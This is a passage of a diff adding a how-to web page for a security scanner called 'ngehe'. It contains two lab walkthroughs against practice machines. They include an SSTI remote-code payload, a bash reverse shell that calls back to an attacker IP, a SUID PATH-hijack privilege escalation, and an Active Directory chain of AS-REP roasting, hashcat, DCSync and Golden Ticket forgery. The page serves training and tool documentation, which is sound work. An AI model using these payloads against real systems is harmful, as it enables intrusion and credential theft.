+<pre><span class="ok">$</span> curl -G <span class="str">"http://box.htb/api/render"</span> \
+    --data-urlencode <span class="str">"msg={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"</span>
+
+<span class="cmt"># {"rendered":"Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}</span></pre>
+
+      <h4>Step 4 — catch a reverse shell</h4>
+<pre><span class="cmt"># Terminal 1 — listener</span>
+<span class="ok">$</span> nc -lvnp 4444
+
+<span class="cmt"># Terminal 2 — fire the reverse shell (replace IP with your tun0)</span>
+<span class="ok">$</span> curl -G <span class="str">"http://box.htb/api/render"</span> --data-urlencode \
+    <span class="str">"msg={{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1\"').read()}}"</span></pre>
+
+      <p>Upgrade the catched shell to a proper TTY:</p>
+<pre>python3 -c <span class="str">'import pty; pty.spawn("/bin/bash")'</span>
+^Z
+stty raw -echo; fg
+export TERM=xterm</pre>
+
+      <h4>Step 5 — privesc</h4>
+<pre>cat /home/*/user.txt                        <span class="cmt"># user flag</span>
+find / -perm -4000 -type f 2&gt;/dev/null      <span class="cmt"># SUID binaries</span>
+sudo -l                                     <span class="cmt"># sudoable as www-data?</span></pre>
+
+      <p>You spot <code>/usr/local/bin/backup-tool</code> is SUID-root. <code>strings</code> reveals it calls <code>tar</code> without an absolute path. Classic PATH hijack:</p>
+<pre>echo <span class="str">'#!/bin/bash
+chmod +s /bin/bash'</span> &gt; /tmp/tar
+chmod +x /tmp/tar
+export PATH=/tmp:$PATH
+/usr/local/bin/backup-tool        <span class="cmt"># now runs your tar as root</span>
+/bin/bash -p                       <span class="cmt"># SUID bash → root shell</span>
+cat /root/root.txt</pre>
+
+      <p class="muted">ngehe found the initial RCE and gave you the exact payload. The shell upgrade and privesc were manual.</p>
+
+      <hr class="hr-soft" />
+
+      <h3>Walkthrough 2 — AD box (LDAP enum → AS-REP roast → BloodHound → DCSync → DA)</h3>
+      <p>Box at <code>10.10.11.99</code>, domain <code>corp.htb</code>. Add both to <code>/etc/hosts</code>.</p>
+
+      <h4>Step 1 — full-spectrum scan</h4>
+<pre><span class="ok">$</span> ngehe box --target 10.10.11.99 --domain corp.htb \
+    --profile service --markdown box.md</pre>
+
+<pre>tcp/53 domain                  → 1 findings
+tcp/88 kerberos-sec            → 0 findings
+tcp/139 netbios-ssn            → 1 findings
+tcp/389 ldap                   → 3 findings
+tcp/445 microsoft-ds           → 2 findings
+total: 12 findings</pre>
+
+      <p>Top of <code>box.md</code>:</p>
+      <div class="codecard">
+        <div class="filename">box.md</div>
+<pre><span class="kw">## Suggested attack chain</span>
+
+<span class="kw">1.</span> [HIGH] ldap-asrep-roastable — TCP ldap://10.10.11.99:389/
+   evidence: svc-helpdesk, kiosk, guest-printer
+
+   GetNPUsers.py corp.htb/ -no-pass -usersfile users.txt
+
+<span class="kw">2.</span> [MEDIUM] ldap-user-enum — TCP ldap://10.10.11.99:389/
+   evidence: administrator, krbtgt, alice, bob, svc-helpdesk, ...
+
+<span class="kw">3.</span> [HIGH] smb-anonymous-allowed — TCP smb://10.10.11.99:445/
+   evidence: shares: IPC$, NETLOGON, SYSVOL, public</pre>
+      </div>
+
+      <h4>Step 2 — AS-REP roast</h4>
+<pre><span class="cmt"># Save the user list ngehe produced</span>
+<span class="ok">$</span> jq -r <span class="str">'select(.rule == "ldap-user-enum") | .evidence'</span> box.jsonl \
+    | tr <span class="str">','</span> <span class="str">'\n'</span> | sed <span class="str">'s/^ *//'</span> &gt; users.txt
+
+<span class="cmt"># AS-REP roast with impacket (the playbook hint points you here)</span>
+<span class="ok">$</span> GetNPUsers.py corp.htb/ -no-pass -usersfile users.txt -outputfile asrep.hashes
+
+<span class="cmt"># Crack</span>
+<span class="ok">$</span> hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
+<span class="cmt"># svc-helpdesk:Welcome1!</span></pre>
+
+      <h4>Step 3 — BloodHound graph</h4>
+<pre><span class="ok">$</span> bloodhound-python -u svc-helpdesk -p <span class="str">'Welcome1!'</span> -d corp.htb \
+    -ns 10.10.11.99 -c all</pre>
+      <p>Import the JSON into BloodHound CE. Shortest paths to DA from <code>SVC-HELPDESK@CORP.HTB</code>:</p>
+<pre>SVC-HELPDESK → MemberOf → HELPDESK group → ForceChangePassword → SYSADMINS group → AdminTo → DC01</pre>
+
+      <h4>Step 4 — exploit the ACL</h4>
+<pre><span class="cmt"># Reset bob's password (bob is in SYSADMINS)</span>
+<span class="ok">$</span> net rpc password <span class="str">'bob'</span> -U <span class="str">'corp.htb/svc-helpdesk%Welcome1!'</span> -S 10.10.11.99
+<span class="cmt"># (enter a new password — Pwn3d2026!)</span></pre>
+
+      <h4>Step 5 — DCSync → Golden Ticket → DA</h4>
+<pre><span class="cmt"># Dump every domain hash including krbtgt</span>
+<span class="ok">$</span> secretsdump.py corp.htb/bob:<span class="str">'Pwn3d2026!'</span>@10.10.11.99 -just-dc
+
+<span class="cmt"># Forge a Golden Ticket</span>
+<span class="ok">$</span> ticketer.py -nthash &lt;krbtgt-nt-hash&gt; -domain-sid &lt;SID&gt; \
+    -domain corp.htb administrator
+<span class="ok">$</span> export KRB5CCNAME=administrator.ccache
+
+<span class="cmt"># WinRM in as Domain Admin</span>
+<span class="ok">$</span> evil-winrm -i 10.10.11.99 -u administrator -H &lt;admin-nt-hash&gt;
+
+<span class="cmt"># Loot</span>
+<span class="ok">$</span> type C:\Users\Administrator\Desktop\root.txt</pre>
+
+      <p class="muted">ngehe gave you the user list, the AS-REP-roastable subset, and the playbook. The cracking + graph + AD takeover used dedicated tools (<code>hashcat</code>, <code>BloodHound</code>, <code>impacket</code>).</p>
+
+      <hr class="hr-soft" />
+
+      <h3>What ngehe did and didn't do</h3>
+      <p><strong>ngehe did:</strong></p>
+      <ul>
+        <li>Discovered open ports + identified services (via nmap)</li>
+        <li>Found the SSTI bug + told you the engine + gave you the RCE payload</li>
+        <li>Surfaced the .env / .git / sensitive files</li>
+        <li>Got the DNS zone transfer</li>
+        <li>Enumerated AD users + flagged AS-REP-roastable accounts</li>
+        <li>Identified SMB anonymous access</li>
+        <li>Bundled all of it into a Suggested attack chain with literal commands</li>
+      </ul>
+      <p><strong>You did manually:</strong></p>
+      <ul>
+        <li>Crafted the reverse-shell payload (substituted your attacker IP)</li>
+        <li>Upgraded the shell to a TTY</li>
+        <li>Found the SUID privesc (next time, automate with <code>linpeas</code> / <code>winpeas</code>)</li>
+        <li>Ran hashcat (ngehe outputs hashcat-format; doesn't crack)</li>
+        <li>Used BloodHound's graph (ngehe emits the JSON; BloodHound visualizes)</li>
+        <li>DCSynced (out of ngehe's scope today; use <code>impacket</code>)</li>
+      </ul>
+      <p>The split is intentional: ngehe automates <strong>discovery + initial-exploitation evidence</strong>. Cracking, graph analysis, AD takeover are dedicated jobs handled by <code>hashcat</code>, <code>BloodHound</code>, <code>impacket</code>.</p>
+
+      <h2 id="demo">End-to-end demo</h2>
+      <p>The repository ships a deliberately vulnerable demo API with a planted bug for every detector:</p>
+<pre><span class="cmt"># Terminal 1</span>
+<span class="ok">$</span> cd examples/vuln-api &amp;&amp; go run .
+
+<span class="cmt"># Terminal 2</span>
+<span class="ok">$</span> ngehe recon --target http://127.0.0.1:8787 --top 800 --markdown recon.md
+<span class="ok">$</span> ngehe scan \
+    --har examples/vuln-api/alice.har \
+    --config examples/vuln-api/ngehe.yaml \
+    --markdown findings.md</pre>
+      <p>You should see findings from every active detector. Read <code>examples/vuln-api/main.go</code> to see which bugs were planted; every HIGH/CRITICAL finding should map to one of them.</p>
+
+      <h2 id="troubleshooting">Troubleshooting</h2>
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th style="width:38%">Symptom</th><th>Likely cause</th></tr></thead>
+          <tbody>
+            <tr><td><code>loaded 0 in-scope requests</code></td><td><code>scope.hosts</code> doesn't match the host in the HAR. Hosts include the port.</td></tr>
+            <tr><td>Login fails at scan start</td><td><code>token_jsonpath</code> wrong or login URL unreachable.</td></tr>
+            <tr><td>Every BOLA finding looks like a false positive</td><td>Baseline session not detected. Supply the captured user's exact bearer in the session config, or ensure the JWT <code>sub</code> claim matches <code>session.Name</code>.</td></tr>
+            <tr><td>JWT abuse fires zero</td><td><code>jwt_probe_url</code> empty, or returns non-2xx for valid tokens, or sessions use opaque tokens instead of JWTs.</td></tr>
+            <tr><td>SQLi/CMDi/SSTI fire zero on known-vuln target</td><td>Target response may not match ngehe's oracles. SQLi needs DB error strings or measurable time delays. CMDi-marker needs shell execution. CMDi-time needs sleep deltas above network jitter.</td></tr>
+            <tr><td>Dir-bruteforce skipped with "catch-all SPA?"</td><td>Target returns 200/302 for any random path — single-page app or catch-all router. Manual review needed.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p style="margin-top:32px;">
+        Source for this page: <a href="https://github.com/chud-lori/ngehe/blob/main/HOWTO.md">HOWTO.md</a> ·
+        Back to <a href="./">overview</a>.
+      </p>
+
+    </article>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <div class="row">
+      <div><strong>ngehe</strong> — Apache-2.0. SecLists wordlists are MIT.</div>
+      <ul>
+        <li><a href="./">Overview</a></li>
+        <li><a href="https://github.com/chud-lori/ngehe">GitHub</a></li>
+        <li><a href="https://github.com/chud-lori/ngehe/issues">Issues</a></li>
+      </ul>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
